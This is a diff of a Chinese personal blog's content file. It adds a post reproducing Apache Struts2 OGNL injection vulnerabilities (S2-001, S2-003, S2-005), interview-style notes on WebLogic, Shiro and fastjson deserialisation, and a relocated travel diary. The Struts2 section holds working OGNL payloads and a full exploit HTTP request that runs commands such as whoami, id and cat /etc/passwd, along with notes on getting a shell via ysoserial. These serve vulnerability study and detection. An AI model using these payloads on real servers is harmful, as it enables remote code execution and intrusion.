@@ -5,7 +5,77 @@
     <url>/posts/48203.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer">
 
-<p>暂时空</p>
+<h2 id="前言知识"><a href="#前言知识" class="headerlink" title="前言知识"></a>前言知识</h2><h3 id="ognl表达式注入"><a href="#ognl表达式注入" class="headerlink" title="ognl表达式注入"></a>ognl表达式注入</h3><p>对象导航图语言，用于访问对象的字段、方法。基于简化访问java对象属性和调用方法需求，实现字段类型转化等功能；访问列表的元素：peoplelist[0]</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正常java代码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> MyUser.getName()</span><br><span class="line"><span class="comment">//表达式写法</span></span><br><span class="line">#MyUser.name</span><br></pre></td></tr></table></figure>
+
+<h4 id="对静态方法或变量的访问"><a href="#对静态方法或变量的访问" class="headerlink" title="对静态方法或变量的访问"></a>对静态方法或变量的访问</h4><ul>
+<li>java：类名.方法名</li>
+<li>ognl：@类名@方法名</li>
+</ul>
+<h4 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h4><p>后端写了一段程序：使用了ognl这个功能，getValue值可控，用户传入恶意表达式，导致漏洞</p>
+<p>%{value}将表达式值转换为字符串格式，在数据库查询参数的动态构造中非常有用</p>
+<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p>在java中，方法的<strong>作用域</strong>指的是方法<strong>可以被访问的范围</strong>。</p>
+<ol>
+<li>Public：公共方法，可以被任何类访问</li>
+<li>Protected：受保护方法，可以被同一包内的类和该类的子类访问</li>
+<li>Default（package-private）：默认方法，只能被同一包内的类访问</li>
+<li>Private：私有方法，只能在定义该方法的类内部访问</li>
+</ol>
+<h4 id="使用Runtime时"><a href="#使用Runtime时" class="headerlink" title="使用Runtime时"></a>使用Runtime时</h4><p>为啥不用通过 new 这种形式来创建对象</p>
+<p>Runtime的类构造方法定义域时private–&gt;导致无法new一个新的对象出来</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616221736840-1006422143.png" alt="image-20240616221741744"></p>
+<p>那怎样获取Runtime的对象？<br><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616221521627-691059725.png" alt="image-20240616221526053"></p>
+<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>在java中，static关键字用于表示一个成员属于类本身，而不是某个对象</p>
+<ul>
+<li>无需创建类的实例即可被调用，可使用类名+方法名调用，例如ClassName.methodName()</li>
+<li>非静态成员依赖于对象实例；静态方法不依赖任何实例</li>
+</ul>
+<h4 id="如何去执行"><a href="#如何去执行" class="headerlink" title="如何去执行"></a>如何去执行</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br><span class="line">定义currentRuntime的私有静态变量，初始化为一个新的Runtime对象。然后，它提供了一个公共静态方法getRuntime()，该方法返回currentRuntime变量的值。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616223223048-1053557580.png" alt="image-20240616223228152"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Runtime(); 不能用</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime(); 获取到Runtime对象</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>用户提交表单数据并验证失败时，后端会将用户之前提交的参数值使用ognl表达式%{value}进行解析，然后重新填充到对应的表单数据中。</p>
+<p>例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取tomcat执行路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">/usr/local/tomcat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616224654112-1086478625.png" alt="image-20240616224658534"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line">/usr/local/tomcat/webapps/ROOT/ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616224906599-1489159828.png" alt="image-20240616224911469"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//执行任意命令</span><br><span class="line">new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616225503869-755811821.png" alt="image-20240616225506526"></p>
+<h3 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h3><p>ognl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，通过unicode编码（u2003）或8进制即可绕过安全限制，从而操纵服务器端上下文对象</p>
+<p>公布的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /s2_war/index.action?(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&amp;(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&amp;(%27\u0023mycmd\u003d\%27id\%27%27)(bla)(bla)&amp;(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&amp;(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&amp;(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&amp;(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&amp;(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&amp;(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&amp;(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla)) HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,pt;q=0.7,da;q=0.6</span><br><span class="line">Cookie: JSESSIONID=FC7DC2221FDB37EAE855C6E6A11E9CC1; _ga=GA1.1.267931382.1545202285</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>请求响应内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache-Coyote/1.1</span><br><span class="line">Date: Mon, 24 Dec 2018 09:36:01 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">uid=1234556(xxxx) gid=1603212982 groups=1603212982....</span><br></pre></td></tr></table></figure>
+
+<h3 id="S3-005"><a href="#S3-005" class="headerlink" title="S3-005"></a>S3-005</h3><p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p>
+<ul>
+<li><p>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</p>
+</li>
+<li><p>S2-003后官方增加了安全模式（沙盒）</p>
+</li>
+<li><p>S2-005使用ognl表达式将沙盒关闭，继续使用代码</p>
+</li>
+</ul>
+<p>poc（无回显，空格用@代替）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616231743715-604972521.png" alt="image-20240616231748445"></p>
+<p>进入容器可以看到&#x2F;tmp下创建了success文件</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616231712456-1645109332.png" alt="image-20240616231717266"></p>
+<h1 id="struts2攻击特征有哪些"><a href="#struts2攻击特征有哪些" class="headerlink" title="struts2攻击特征有哪些"></a>struts2攻击特征有哪些</h1><p><strong>RCE试图传⼊的命令以及执⾏结果</strong> </p>
+<p><strong>参数伪造，试图传⼊OGNL表达式</strong></p>
+<h1 id="struts2的特征"><a href="#struts2的特征" class="headerlink" title="struts2的特征"></a>struts2的特征</h1><p><strong>.do .action后缀常会出现，.jsp也可能</strong></p>
+<p><strong>能够处理OGNL表达式</strong></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -101,67 +171,6 @@
       </categories>
   </entry>
   <entry>
-    <title>旅游vlog</title>
-    <url>/posts/e42dbe7e.html</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer">
-
-<p>两年的游玩，加上外地比赛，已经累计到6700分数了哈哈哈，可以免费做一次洛阳的火车了</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609235146437-746849895.png" alt="image-20240609235145981"></p>
-<h2 id="23年二月-商丘"><a href="#23年二月-商丘" class="headerlink" title="23年二月 商丘"></a>23年二月 商丘</h2><p>骑马</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609235855070-349630753.png" alt="image-20240609235854475"></p>
-<p>赛车</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609235922572-1439168124.png" alt="image-20240609235916947"></p>
-<p>看古城</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000033705-1839786062.png" alt="image-20240610000031135"></p>
-<h2 id="23年四月-开封"><a href="#23年四月-开封" class="headerlink" title="23年四月 开封"></a>23年四月 开封</h2><p>鼓楼，其实也就是个建筑，附近都是小吃，来之前就听说鼓楼附近的小吃坑外地人，到最后发现都一样，可能是女友砍价能力无声侧漏了哈哈哈哈</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000259773-1915523068.png" alt="image-20240610000258835"></p>
-<p>期待已久的打铁花，现场很美，博客画质可能在图床被压缩了，效果没展现出来</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000625079-1301771947.png" alt="image-20240610000624124"></p>
-<p>虽然我没去参加过演唱会，酒吧，但是万岁山的音乐节氛围烘托得也是超级棒，我的牛仔裤就是因为台阶太高冲上台的时候开档了哈哈哈哈哈，挺奇葩的</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000959834-909010269.png" alt="image-20240610000958816"></p>
-<h2 id="23年四月-洛阳"><a href="#23年四月-洛阳" class="headerlink" title="23年四月 洛阳"></a>23年四月 洛阳</h2><p>玩的话应该是龙门石窟比较好，感觉都是景色，千篇一律，旅游就是享受自由的感觉</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610001415503-106223712.png" alt="image-20240610001414507"></p>
-<p>念念不忘的不是打卡点，而是那天和傻鸟骑车，在空无一人的马路上飞驰的瞬间，在陌生城市漫无目的行走的松弛感</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610001628619-1480015057.png" alt="image-20240610001625964"></p>
-<p>现在回想，当时忘记给傻鸟穿汉服拍照了，真是遗憾啦</p>
-<h2 id="23年五月-郑州登封"><a href="#23年五月-郑州登封" class="headerlink" title="23年五月 郑州登封"></a>23年五月 郑州登封</h2><p>嵩山的景色很美，夏日温度山内外温度简直差别巨大</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002528685-142711459.png" alt="image-20240610002527596"></p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002556216-262726712.png" alt="image-20240610002555576"></p>
-<h2 id="23年十二月-武汉"><a href="#23年十二月-武汉" class="headerlink" title="23年十二月 武汉"></a>23年十二月 武汉</h2><p>黄鹤楼</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002924613-1983262460.png" alt="image-20240610002923127"></p>
-<p>步行街江汉关</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003027894-1658771681.png" alt="image-20240610003027550"></p>
-<p>长江大桥，那天晚上下着雨刮着大风，傻鸟害怕不敢下来，内心害怕被人杀害，有点小脆弱啊哈哈哈，风凉凉的，吹的很冷也很清醒，很喜欢这种自由的感觉</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003052750-631552577.png" alt="image-20240610003051755"></p>
-<p>去许昌，忘记啥原因了没坐上水上公交，但是去武汉去武汉也没坐上，因为下雨船只封闭，有点离谱了哈哈哈，傻鸟还因为这事情心情低落<img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003517855-927015852.png" alt="image-20240610003513205"></p>
-<h2 id="24年二月-徐州"><a href="#24年二月-徐州" class="headerlink" title="24年二月 徐州"></a>24年二月 徐州</h2><p>必须和本地人去云龙湖对掏</p>
-<p>电鳗，就想看看他和小鲨鱼实战的场景</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003809562-1194830605.png" alt="image-20240610003803536"></p>
-<p>无忧无虑，囚笼<img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003909673-548240670.png" alt="image-20240610003904633"></p>
-<p>这还是小个子，压迫感就很强，不敢想见到海洋里的大鲨鱼会不会吓得应激反应</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004010708-1279197733.png" alt="image-20240610004010404"></p>
-<h2 id="24年四月-焦作"><a href="#24年四月-焦作" class="headerlink" title="24年四月 焦作"></a>24年四月 焦作</h2><p>云台山上酒店是真的多，多亏傻鸟找了家性价比很高的崭新酒店</p>
-<p>山上物价几乎和方特一样了</p>
-<p>红石峡应该是景色最好的了</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004439818-1718239269.png" alt="image-20240610004430581"></p>
-<p>一叶扁舟</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004511751-1526690432.png" alt="image-20240610004505454"></p>
-<p>套你猴子</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004543291-1559204537.png" alt="image-20240610004530177"></p>
-<p>第一天很新鲜；第二天的内心就是花钱受罪了哈哈哈哈</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004643011-2061532258.png" alt="image-20240610004637830"></p>
-<h2 id="24年四月-西安"><a href="#24年四月-西安" class="headerlink" title="24年四月 西安"></a>24年四月 西安</h2><p>买了将近200的零食在路上吃，就怕无聊，哈哈哈哈</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005004439-1352672664.png" alt="image-20240610004959118"></p>
-<p>越看越熟悉，原来是现代房玄龄和杜如晦直播的地</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005030831-1684737016.png" alt="image-20240610005016115"></p>
-<p>感觉大唐不夜城不过尔尔，都是宣传的效果罢了，和开封的建筑风格差不多，都是灯光秀</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005120749-766008487.png" alt="image-20240610005115208"></p>
-]]></content>
-      <categories>
-        <category>生活</category>
-      </categories>
-  </entry>
-  <entry>
     <title>基于github+Cloudflare搭建个人博客</title>
     <url>/posts/2f7875ad.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer">
@@ -234,6 +243,67 @@
 ]]></content>
       <categories>
         <category>博客配置</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>旅游vlog</title>
+    <url>/posts/e42dbe7e.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<p>两年的游玩，加上外地比赛，已经累计到6700分数了哈哈哈，可以免费做一次洛阳的火车了</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609235146437-746849895.png" alt="image-20240609235145981"></p>
+<h2 id="23年二月-商丘"><a href="#23年二月-商丘" class="headerlink" title="23年二月 商丘"></a>23年二月 商丘</h2><p>骑马</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609235855070-349630753.png" alt="image-20240609235854475"></p>
+<p>赛车</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609235922572-1439168124.png" alt="image-20240609235916947"></p>
+<p>看古城</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000033705-1839786062.png" alt="image-20240610000031135"></p>
+<h2 id="23年四月-开封"><a href="#23年四月-开封" class="headerlink" title="23年四月 开封"></a>23年四月 开封</h2><p>鼓楼，其实也就是个建筑，附近都是小吃，来之前就听说鼓楼附近的小吃坑外地人，到最后发现都一样，可能是女友砍价能力无声侧漏了哈哈哈哈</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000259773-1915523068.png" alt="image-20240610000258835"></p>
+<p>期待已久的打铁花，现场很美，博客画质可能在图床被压缩了，效果没展现出来</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000625079-1301771947.png" alt="image-20240610000624124"></p>
+<p>虽然我没去参加过演唱会，酒吧，但是万岁山的音乐节氛围烘托得也是超级棒，我的牛仔裤就是因为台阶太高冲上台的时候开档了哈哈哈哈哈，挺奇葩的</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000959834-909010269.png" alt="image-20240610000958816"></p>
+<h2 id="23年四月-洛阳"><a href="#23年四月-洛阳" class="headerlink" title="23年四月 洛阳"></a>23年四月 洛阳</h2><p>玩的话应该是龙门石窟比较好，感觉都是景色，千篇一律，旅游就是享受自由的感觉</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610001415503-106223712.png" alt="image-20240610001414507"></p>
+<p>念念不忘的不是打卡点，而是那天和傻鸟骑车，在空无一人的马路上飞驰的瞬间，在陌生城市漫无目的行走的松弛感</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610001628619-1480015057.png" alt="image-20240610001625964"></p>
+<p>现在回想，当时忘记给傻鸟穿汉服拍照了，真是遗憾啦</p>
+<h2 id="23年五月-郑州登封"><a href="#23年五月-郑州登封" class="headerlink" title="23年五月 郑州登封"></a>23年五月 郑州登封</h2><p>嵩山的景色很美，夏日温度山内外温度简直差别巨大</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002528685-142711459.png" alt="image-20240610002527596"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002556216-262726712.png" alt="image-20240610002555576"></p>
+<h2 id="23年十二月-武汉"><a href="#23年十二月-武汉" class="headerlink" title="23年十二月 武汉"></a>23年十二月 武汉</h2><p>黄鹤楼</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002924613-1983262460.png" alt="image-20240610002923127"></p>
+<p>步行街江汉关</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003027894-1658771681.png" alt="image-20240610003027550"></p>
+<p>长江大桥，那天晚上下着雨刮着大风，傻鸟害怕不敢下来，内心害怕被人杀害，有点小脆弱啊哈哈哈，风凉凉的，吹的很冷也很清醒，很喜欢这种自由的感觉</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003052750-631552577.png" alt="image-20240610003051755"></p>
+<p>去许昌，忘记啥原因了没坐上水上公交，但是去武汉去武汉也没坐上，因为下雨船只封闭，有点离谱了哈哈哈，傻鸟还因为这事情心情低落<img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003517855-927015852.png" alt="image-20240610003513205"></p>
+<h2 id="24年二月-徐州"><a href="#24年二月-徐州" class="headerlink" title="24年二月 徐州"></a>24年二月 徐州</h2><p>必须和本地人去云龙湖对掏</p>
+<p>电鳗，就想看看他和小鲨鱼实战的场景</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003809562-1194830605.png" alt="image-20240610003803536"></p>
+<p>无忧无虑，囚笼<img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003909673-548240670.png" alt="image-20240610003904633"></p>
+<p>这还是小个子，压迫感就很强，不敢想见到海洋里的大鲨鱼会不会吓得应激反应</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004010708-1279197733.png" alt="image-20240610004010404"></p>
+<h2 id="24年四月-焦作"><a href="#24年四月-焦作" class="headerlink" title="24年四月 焦作"></a>24年四月 焦作</h2><p>云台山上酒店是真的多，多亏傻鸟找了家性价比很高的崭新酒店</p>
+<p>山上物价几乎和方特一样了</p>
+<p>红石峡应该是景色最好的了</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004439818-1718239269.png" alt="image-20240610004430581"></p>
+<p>一叶扁舟</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004511751-1526690432.png" alt="image-20240610004505454"></p>
+<p>套你猴子</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004543291-1559204537.png" alt="image-20240610004530177"></p>
+<p>第一天很新鲜；第二天的内心就是花钱受罪了哈哈哈哈</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004643011-2061532258.png" alt="image-20240610004637830"></p>
+<h2 id="24年四月-西安"><a href="#24年四月-西安" class="headerlink" title="24年四月 西安"></a>24年四月 西安</h2><p>买了将近200的零食在路上吃，就怕无聊，哈哈哈哈</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005004439-1352672664.png" alt="image-20240610004959118"></p>
+<p>越看越熟悉，原来是现代房玄龄和杜如晦直播的地</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005030831-1684737016.png" alt="image-20240610005016115"></p>
+<p>感觉大唐不夜城不过尔尔，都是宣传的效果罢了，和开封的建筑风格差不多，都是灯光秀</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005120749-766008487.png" alt="image-20240610005115208"></p>
+]]></content>
+      <categories>
+        <category>生活</category>
       </categories>
   </entry>
   <entry>
@@ -536,8 +606,35 @@
 <li>suid </li>
 <li>计划任务</li>
 </ul>
-<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><h4 id="struts2框架漏洞原理"><a href="#struts2框架漏洞原理" class="headerlink" title="struts2框架漏洞原理"></a><strong>struts2框架漏洞原理</strong></h4><p> java 的 web 框架</p>
-<h4 id="weblogic权限绕过"><a href="#weblogic权限绕过" class="headerlink" title="weblogic权限绕过"></a>weblogic权限绕过</h4><h4 id="log4j反序列化"><a href="#log4j反序列化" class="headerlink" title="log4j反序列化"></a>log4j反序列化</h4><h4 id="Shiro反序列化漏洞"><a href="#Shiro反序列化漏洞" class="headerlink" title="Shiro反序列化漏洞"></a>Shiro反序列化漏洞</h4><h4 id="weblogic有⼏种漏洞"><a href="#weblogic有⼏种漏洞" class="headerlink" title="weblogic有⼏种漏洞"></a>weblogic有⼏种漏洞</h4><h4 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h4><h4 id="redis未授权与权限获取"><a href="#redis未授权与权限获取" class="headerlink" title="redis未授权与权限获取"></a>redis未授权与权限获取</h4><h2 id="常见反序列化流量特征"><a href="#常见反序列化流量特征" class="headerlink" title="常见反序列化流量特征"></a>常见反序列化流量特征</h2><p>shiro就看cookie中Rememberme字段，什么都要从这⾥传</p>
+<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><h4 id="struts2框架漏洞"><a href="#struts2框架漏洞" class="headerlink" title="struts2框架漏洞"></a><strong>struts2框架漏洞</strong></h4><p> java 的 web 框架</p>
+<p><strong>特征</strong></p>
+<ul>
+<li>.do .action后缀常会出现，.jsp也可能 </li>
+<li>能够处理OGNL表达式</li>
+</ul>
+<p><strong>攻击特征：</strong></p>
+<ul>
+<li>RCE试图传⼊的命令以及执⾏结果</li>
+<li>参数伪造，试图传⼊OGNL表达式</li>
+</ul>
+<h4 id="weblogic权限绕过"><a href="#weblogic权限绕过" class="headerlink" title="weblogic权限绕过"></a>weblogic权限绕过</h4><p>CVE-2020-14882：  </p>
+<p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic 管理控制台。 攻击者 可以构造特殊请求的URL，即可未授权访问到管理后台⻚⾯，访问后台后是⼀个低权限的⽤ 户，⽆法安 装应⽤， 也⽆法直接执⾏任意代码。</p>
+<p>CVE-2020-14883：</p>
+<p>允许后台任意⽤户通过HTTP协议执⾏任意命令。使⽤这两个漏洞组成的利⽤链，可通过⼀个HTTP 请求 在远程Weblogic 服务器上以未授权的任意⽤户身份执⾏命令</p>
+<h4 id="log4j反序列化"><a href="#log4j反序列化" class="headerlink" title="log4j反序列化"></a>log4j反序列化</h4><h4 id="Shiro反序列化漏洞"><a href="#Shiro反序列化漏洞" class="headerlink" title="Shiro反序列化漏洞"></a>Shiro反序列化漏洞</h4><p><strong>如何判断shiro：</strong></p>
+<ul>
+<li>登录界⾯的“ 记住我”“ 记住密码” 等</li>
+<li>请求包Cookie中存在rememberMe字段</li>
+<li>登录失败返回rememberMe&#x3D;deleteMe字段</li>
+</ul>
+<p><strong>shiro550与shiro721的区别，利⽤⽅式以及原理</strong> </p>
+<ul>
+<li>550可直接跑默认key，shiro721默认key跑不了，需要⼀个登录成功的cookie</li>
+<li>Cookie中这个rememberMe字段，它是先对相关信息序列化，通过AES加密，再base64 编码，然后传⼊服务器，到服务器那⾥base64解码，AES解密，然后反序列化  AES这个Key曾经是固定的⼀个默认key，我们轻⽽易举能够构造恶意代码传⼊服务器，对于更 改过的key可以进⾏爆破爆出来，还是可以打这个反序列化</li>
+<li>使⽤ysoserial，通过检测出来的CC链⼦监听⼀个JRMP端⼝，我们向服务器传⼊的 payload就是指向这个端⼝，然后⼀旦Cookie发送到服务器，服务器连接到我们的JRMP服务 器，ysoserial⾃动通过CC链⼦把弹shell的命令打过去getshell</li>
+</ul>
+<h4 id="weblogic有⼏种漏洞"><a href="#weblogic有⼏种漏洞" class="headerlink" title="weblogic有⼏种漏洞"></a>weblogic有⼏种漏洞</h4><h4 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h4><p>使⽤ysoserial，通过检测出来的CC链⼦监听⼀个JRMP端⼝，我们向服务器传⼊的 payload就是指向这个端⼝，然后⼀旦Cookie发送到服务器，服务器连接到我们的JRMP服务 器，ysoserial⾃动通过CC链⼦把弹shell的命令打过去getshell</p>
